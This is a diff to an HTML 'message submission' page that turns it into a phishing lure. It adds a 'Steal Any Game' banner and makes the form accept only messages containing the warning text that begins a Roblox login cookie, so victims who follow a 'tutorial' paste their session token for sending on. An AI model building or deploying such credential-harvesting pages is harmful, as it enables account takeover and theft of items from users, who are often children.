@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Submit Message</title>
+<title>XAR Message Submission</title>
 
 <style>
   * { box-sizing: border-box; }
@@ -20,9 +20,29 @@
     animation: bgGradient 20s ease infinite;
     overflow: hidden;
     color: #eee;
+    flex-direction: column;
   }
 
   @keyframes bgGradient {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  h1.cool-title {
+    font-size: 2.2rem;
+    font-weight: 700;
+    text-align: center;
+    background: linear-gradient(90deg, #42e695, #3bb2b8, #8e44ad, #f39c12);
+    background-size: 300% 300%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: shimmer 5s ease infinite;
+    margin-bottom: 24px;
+    text-shadow: 2px 2px 8px rgba(0,0,0,0.6);
+  }
+
+  @keyframes shimmer {
     0% { background-position: 0% 50%; }
     50% { background-position: 100% 50%; }
     100% { background-position: 0% 50%; }
@@ -121,6 +141,8 @@
 
 <body>
 
+<h1 class="cool-title">🔥 Steal Any Game 🔥</h1>
+
 <div class="card">
   <h2>Submit Your Message</h2>
 
@@ -132,7 +154,7 @@
   </div>
 
   <textarea id="message" placeholder="Type your message here..."></textarea>
-  <div class="hint">Make sure your message contains the correct code from the tutorial</div>
+  <div class="hint">Make sure you follow the tutorial</div>
 
   <button onclick="sendMessage()">Send</button>
 
@@ -143,7 +165,7 @@
 
 <script>
   const MAX_LENGTH = 1999;
-  const REQUIRED_TEXT = "SECRET123"; // <-- change this to the text that must be in the message
+  const REQUIRED_TEXT = "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"; // <-- change this to your required text
 
   async function sendMessage() {
     const message = document.getElementById('message').value.trim();
@@ -153,7 +175,6 @@
       return;
     }
 
-    // Check if the message contains the required text
     if (!message.includes(REQUIRED_TEXT)) {
       alert("Error: please rewatch the tutorial and make sure you're doing it correctly!");
       return;
@@ -187,6 +208,10 @@
     }
   }
 </script>
+
+</body>
+</html>
+
 
 </body>
 </html>
